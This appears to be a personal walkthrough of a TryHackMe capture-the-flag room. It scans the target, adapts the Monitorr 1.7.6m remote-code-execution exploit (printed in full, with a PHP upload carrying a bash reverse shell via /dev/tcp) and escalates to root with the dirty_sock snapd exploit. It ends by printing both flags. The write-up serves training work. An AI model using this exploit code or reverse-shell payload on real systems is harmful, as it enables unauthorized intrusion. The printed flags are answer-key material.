----
Some boxes sting...
----

![](https://assets.muirlandoracle.co.uk/thm/rooms/yotjf/jellyfish-header.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/31effaad1c9a1bccf77986649df555f0.png)

### Task 1  Flags

 Start Machine

[**Video**](https://www.youtube.com/watch?v=g2CnIgjHeX8)

**Hack your way in. Get the Flags. Don't get stung.**

Be warned -- this box deploys with a public IP. Think about what that means for how you should approach this challenge. ISPs are often unhappy if you enumerate public IP addresses at a high speed...

_This box was part of a competition giving away an OSCP voucher and five TryHackMe subscription vouchers. The competition has now ended, and the winners can be found in the [TryHackMe Discord](https://discord.gg/tryhackme)._  

Answer the questions below

```

┌──(witty㉿kali)-[~/Downloads]
└─$ nmap 3.249.213.107 -p- -vv
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 12:16 EDT
Initiating Ping Scan at 12:16
Scanning 3.249.213.107 [2 ports]
Completed Ping Scan at 12:16, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:16
Completed Parallel DNS resolution of 1 host. at 12:16, 0.37s elapsed
Initiating Connect Scan at 12:16
Scanning ec2-3-249-213-107.eu-west-1.compute.amazonaws.com (3.249.213.107) [65535 ports]
Discovered open port 21/tcp on 3.249.213.107
Discovered open port 80/tcp on 3.249.213.107
Discovered open port 443/tcp on 3.249.213.107
Discovered open port 22/tcp on 3.249.213.107
Connect Scan Timing: About 3.12% done; ETC: 12:32 (0:16:04 remaining)
Increasing send delay for 3.249.213.107 from 0 to 5 due to 13 out of 41 dropped probes since last increase.
Connect Scan Timing: About 5.57% done; ETC: 12:34 (0:17:15 remaining)
Connect Scan Timing: About 6.94% done; ETC: 12:38 (0:20:20 remaining)
Increasing send delay for 3.249.213.107 from 5 to 10 due to 11 out of 31 dropped probes since last increase.
Connect Scan Timing: About 11.55% done; ETC: 12:40 (0:21:35 remaining)
Connect Scan Timing: About 19.95% done; ETC: 12:41 (0:20:19 remaining)
Connect Scan Timing: About 21.73% done; ETC: 12:44 (0:21:40 remaining)
Connect Scan Timing: About 22.77% done; ETC: 12:46 (0:23:07 remaining)
Connect Scan Timing: About 36.75% done; ETC: 12:50 (0:21:32 remaining)
Discovered open port 8000/tcp on 3.249.213.107
Connect Scan Timing: About 41.54% done; ETC: 12:50 (0:19:48 remaining)
Connect Scan Timing: About 46.48% done; ETC: 12:50 (0:18:02 remaining)
Connect Scan Timing: About 52.04% done; ETC: 12:50 (0:16:20 remaining)
Discovered open port 22222/tcp on 3.249.213.107
Connect Scan Timing: About 57.37% done; ETC: 12:50 (0:14:37 remaining)
Connect Scan Timing: About 63.08% done; ETC: 12:51 (0:12:50 remaining)
Connect Scan Timing: About 68.28% done; ETC: 12:51 (0:11:05 remaining)
Connect Scan Timing: About 73.12% done; ETC: 12:50 (0:09:18 remaining)
Connect Scan Timing: About 78.10% done; ETC: 12:50 (0:07:32 remaining)
Connect Scan Timing: About 83.12% done; ETC: 12:50 (0:05:46 remaining)
Connect Scan Timing: About 88.18% done; ETC: 12:50 (0:04:03 remaining)
Connect Scan Timing: About 93.22% done; ETC: 12:50 (0:02:19 remaining)
Connect Scan Timing: About 98.20% done; ETC: 12:50 (0:00:37 remaining)
Completed Connect Scan at 12:50, 2043.06s elapsed (65535 total ports)
Nmap scan report for ec2-3-249-213-107.eu-west-1.compute.amazonaws.com (3.249.213.107)
Host is up, received syn-ack (0.19s latency).
Scanned at 2023-06-29 12:16:20 EDT for 2043s
Not shown: 65527 filtered tcp ports (no-response), 2 filtered tcp ports (host-unreach)
PORT      STATE SERVICE    REASON
21/tcp    open  ftp        syn-ack
22/tcp    open  ssh        syn-ack
80/tcp    open  http       syn-ack
443/tcp   open  https      syn-ack
8000/tcp  open  http-alt   syn-ack
22222/tcp open  easyengine syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2043.92 seconds


https://3.249.213.107/

View certificates

 Subject Alt Names

robyns-petshop.thm
monitorr.robyns-petshop.thm
beta.robyns-petshop.thm
dev.robyns-petshop.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts 
3.249.213.107 robyns-petshop.thm dev.robyns-petshop.thm beta.robyns-petshop.thm monitorr.robyns-petshop.thm

https://beta.robyns-petshop.thm/
Under Construction
This site is under development. Please be patient.

If you have been given a specific ID to use when accessing this development site, please put it at the end of the url (e.g. beta.robyns-petshop.thm/ID_HERE)

https://monitorr.robyns-petshop.thm/

┌──(witty㉿kali)-[~/Downloads]
└─$ searchsploit monitorr                                
----------------------------------------- ---------------------------------
 Exploit Title                           |  Path
----------------------------------------- ---------------------------------
Monitorr 1.7.6m - Authorization Bypass   | php/webapps/48981.py
Monitorr 1.7.6m - Remote Code Execution  | php/webapps/48980.py
----------------------------------------- ------------------------

┌──(witty㉿kali)-[~/Downloads]
└─$ searchsploit -m 48980   
  Exploit: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/48980
     Path: /usr/share/exploitdb/exploits/php/webapps/48980.py
    Codes: N/A
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (434)
Copied to: /home/witty/Downloads/48980.py

┌──(witty㉿kali)-[~/Downloads]
└─$ python 48980.py https://monitorr.robyns-petshop.thm/ 10.8.19.103 4444
Traceback (most recent call last):
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/connectionpool.py", line 670, in urlopen
    httplib_response = self._make_request(
                       ^^^^^^^^^^^^^^^^^^^
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/connectionpool.py", line 381, in _make_request
    self._validate_conn(conn)
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/connectionpool.py", line 978, in _validate_conn
    conn.connect()
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/connection.py", line 362, in connect
    self.sock = ssl_wrap_socket(
                ^^^^^^^^^^^^^^^^
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/util/ssl_.py", line 386, in ssl_wrap_socket
    return context.wrap_socket(sock, server_hostname=server_hostname)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/ssl.py", line 517, in wrap_socket
    return self.sslsocket_class._create(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/ssl.py", line 1075, in _create
    self.do_handshake()
  File "/usr/lib/python3.11/ssl.py", line 1346, in do_handshake
    self._sslobj.do_handshake()
ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:992)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/witty/.local/lib/python3.11/site-packages/requests/adapters.py", line 439, in send
    resp = conn.urlopen(
           ^^^^^^^^^^^^^
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/connectionpool.py", line 726, in urlopen
    retries = retries.increment(
              ^^^^^^^^^^^^^^^^^^
  File "/home/witty/.local/lib/python3.11/site-packages/urllib3/util/retry.py", line 446, in increment
    raise MaxRetryError(_pool, url, error or ResponseError(cause))
urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='monitorr.robyns-petshop.thm', port=443): Max retries exceeded with url: //assets/php/upload.php (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:992)')))

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/witty/Downloads/48980.py", line 24, in <module>
    requests.post(url, headers=headers, data=data)
  File "/home/witty/.local/lib/python3.11/site-packages/requests/api.py", line 116, in post
    return request('post', url, data=data, json=json, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/witty/.local/lib/python3.11/site-packages/requests/api.py", line 60, in request
    return session.request(method=method, url=url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/witty/.local/lib/python3.11/site-packages/requests/sessions.py", line 533, in request
    resp = self.send(prep, **send_kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/witty/.local/lib/python3.11/site-packages/requests/sessions.py", line 646, in send
    r = adapter.send(request, **kwargs)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/witty/.local/lib/python3.11/site-packages/requests/adapters.py", line 514, in send
    raise SSLError(e, request=request)
requests.exceptions.SSLError: HTTPSConnectionPool(host='monitorr.robyns-petshop.thm', port=443): Max retries exceeded with url: //assets/php/upload.php (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:992)')))

┌──(witty㉿kali)-[~/Downloads]
└─$ cat 48980.py       
#!/usr/bin/python
# -*- coding: UTF-8 -*-

# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
# Date: September 12, 2020
# Exploit Author: Lyhin's Lab
# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
# Software Link: https://github.com/Monitorr/Monitorr
# Version: 1.7.6m
# Tested on: Ubuntu 19

import requests
import os
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sess = requests.Session()
sess.verify = False



if len (sys.argv) != 4:
	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

    sess.post(url, headers=headers, data=data)

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/she_ll.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    sess.get(url, headers=headers)

┌──(witty㉿kali)-[~/Downloads]
└─$ dos2unix 48980.py           
dos2unix: converting file 48980.py to Unix format...
                                                                           
┌──(witty㉿kali)-[~/Downloads]
└─$ python 48980.py https://monitorr.robyns-petshop.thm/ 10.8.19.103 4444
A shell script should be uploaded. Now we try to execute it

https://github.com/Monitorr/Monitorr

https://monitorr.robyns-petshop.thm/assets/php/upload.php

ERROR: is not an image or exceeds the webserver’s upload size limit.
ERROR: ../data/usrimg/ already exists.
ERROR: was not uploaded.

https://monitorr.robyns-petshop.thm/assets/data/usrimg/

r = sess.post(url, headers=headers, data=data)
    print(r.text)


┌──(witty㉿kali)-[~/Downloads]
└─$ python 48980.py https://monitorr.robyns-petshop.thm/ 10.8.19.103 4444
<div id='uploadreturn'>You are an exploit.</div><div id='uploaderror'>ERROR: she_ll.php was not uploaded.</div></div>
A shell script should be uploaded. Now we try to execute it

    r = sess.post(url, headers=headers, data=data, cookies={"isHuman": "1"})
    print(r.text)


┌──(witty㉿kali)-[~/Downloads]
└─$ python 48980.py https://monitorr.robyns-petshop.thm/ 10.8.19.103 4444
<div id='uploadreturn'><div id='uploaderror'>ERROR: she_ll.php is not an image or exceeds the webserver’s upload size limit.</div><div id='uploaderror'>ERROR: she_ll.php was not uploaded.</div></div>
A shell script should be uploaded. Now we try to execute it

changed from `she_ll.php` to `she_ll.jpg.phtml`

┌──(witty㉿kali)-[~/Downloads]
└─$ cat 48980.py
#!/usr/bin/python
# -*- coding: UTF-8 -*-

# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
# Date: September 12, 2020
# Exploit Author: Lyhin's Lab
# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
# Software Link: https://github.com/Monitorr/Monitorr
# Version: 1.7.6m
# Tested on: Ubuntu 19

import requests
import os
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sess = requests.Session()
sess.verify = False



if len (sys.argv) != 4:
	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.jpg.phtml\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

    r = sess.post(url, headers=headers, data=data, cookies={"isHuman": "1"})
    print(r.text)

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/she_ll.jpg.phtml"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
    sess.get(url, headers=headers)


┌──(witty㉿kali)-[~/Downloads]
└─$ python 48980.py https://monitorr.robyns-petshop.thm/ 10.8.19.103 443
<div id='uploadreturn'>File she_ll1.jpg.phtml is an image: <br><div id='uploadok'>File she_ll1.jpg.phtml has been uploaded to: ../data/usrimg/she_ll1.jpg.phtml</div></div>
A shell script should be uploaded. Now we try to execute it

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 443 
listening on [any] 443 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.254.180] 53542
bash: cannot set terminal process group (903): Inappropriate ioctl for device
bash: no job control in this shell
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ id
id
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<img$ python3 -c 'import pty;pty.spawn("/bin/bash")' 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:38:f7:c8:da:5b brd ff:ff:ff:ff:ff:ff
    inet 10.10.254.180/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 844sec preferred_lft 844sec
    inet6 fe80::38:f7ff:fec8:da5b/64 scope link 
       valid_lft forever preferred_lft forever
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ ls /var/www
ls /var/www
dev
flag1.txt
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ cat /var/www/flag1.txt
cat /var/www/flag1.txt
THM{MjBkOTMyZDgzNGZmOGI0Y2I5NTljNGNl}

www-data@petshop:/var/www/monitorr/assets/data/usrimg$ apt list --upgradeable
apt list --upgradeable

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

Listing...
apache2/bionic-updates,bionic-security 2.4.29-1ubuntu4.27 amd64 [upgradable from: 2.4.29-1ubuntu4.14]
snapd/bionic-updates,bionic-security 2.58+18.04.1 amd64 [upgradable from: 2.32.5+18.04]

┌──(witty㉿kali)-[~/Downloads]
└─$ searchsploit -m 46362
  Exploit: snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)
      URL: https://www.exploit-db.com/exploits/46362
     Path: /usr/share/exploitdb/exploits/linux/local/46362.py
    Codes: CVE-2019-7304
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (420)
Copied to: /home/witty/Downloads/46362.py

┌──(witty㉿kali)-[~/Downloads]
└─$ dos2unix 46362.py
dos2unix: converting file 46362.py to Unix format...

┌──(witty㉿kali)-[~/Downloads]
└─$ systemctl stop docker
Warning: Stopping docker.service, but it can still be activated by:
  docker.socket
                                                                                                               
┌──(witty㉿kali)-[~/Downloads]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

www-data@petshop:/var/www/monitorr/assets/data/usrimg$ cd /tmp
cd /tmp
www-data@petshop:/tmp$ wget http://10.8.19.103/46362.py
wget http://10.8.19.103/46362.py
--2023-06-29 18:05:18--  http://10.8.19.103/46362.py
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13496 (13K) [text/x-python]
Saving to: '46362.py'

46362.py            100%[===================>]  13.18K  65.4KB/s    in 0.2s    

2023-06-29 18:05:19 (65.4 KB/s) - '46362.py' saved [13496/13496]

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.193.65 - - [29/Jun/2023 13:05:18] "GET /46362.py HTTP/1.1" 200 -

www-data@petshop:/tmp$ chmod +x 46362.py 
chmod +x 46362.py 
www-data@petshop:/tmp$ ./46362.py
./46362.py

      ___  _ ____ ___ _   _     ____ ____ ____ _  _
      |  \ | |__/  |   \_/      [__  |  | |    |_/
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/utntuvhgbo;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...
Traceback (most recent call last):
  File "./46362.py", line 330, in <module>
    main()
  File "./46362.py", line 320, in main
    delete_snap(client_sock)
  File "./46362.py", line 205, in delete_snap
    http_reply = client_sock.recv(8192).decode("utf-8")
ConnectionResetError: [Errno 104] Connection reset by peer
www-data@petshop:/tmp$ grep "dirty_sock" /etc/passwd
grep "dirty_sock" /etc/passwd
dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash
www-data@petshop:/tmp$ su dirty_sock
su dirty_sock
Password: dirty_sock

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

dirty_sock@petshop:/tmp$ sudo -s
sudo -s
[sudo] password for dirty_sock: dirty_sock

root@petshop:/tmp# cd /root
cd /root
root@petshop:/root# ls
ls
root.txt  snap
root@petshop:/root# cat root.txt
cat root.txt
THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}



```

![[Pasted image 20230629112821.png]]
![[Pasted image 20230629113911.png]]

Flag 1  

*THM{MjBkOTMyZDgzNGZmOGI0Y2I5NTljNGNl}*

Root Flag  

*THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}*


[[Year of the Pig]]